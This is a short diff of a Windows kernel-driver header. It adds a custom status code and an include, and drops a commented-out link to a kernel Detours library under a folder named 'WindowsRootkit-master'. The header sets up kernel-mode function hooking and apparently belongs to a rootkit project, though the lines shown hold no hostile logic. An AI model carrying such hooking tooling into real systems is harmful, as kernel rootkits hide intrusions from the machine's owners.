@@ -13,6 +13,7 @@
 
 // Custom status codes (no trailing semicolon)
 #define STATUS_INVALID_GIVEN_ADDRESS 0x00069420
+#define STATUS_INVALID_BASE 0xFF6969FF
 
 // Tell Detours this is kernel mode
 #define DETOURS_KERNEL
@@ -21,14 +22,14 @@
 #include <ntimage.h>    // IMAGE_* definitions
 #include <ntstrsafe.h>
 #include <intrin.h>
+#include <minwindef.h>
 
 // Detours kernel-mode library
 #include "../../includes/detours.h"
 
 // Project-specific helpers (ensure these guard PE struct definitions internally)
+
 #include "WindowsTypes.hpp"
 #include "MemoryHelper.h"
 #include "KernelUtils.h"
 #include "HookingUtils.h"
-
-//#pragma comment(lib, "C:\\Users\\matanel\\Desktop\\WindowsRootkit-master\\libs\\Detours.StaticLibraryForDriver.lib")
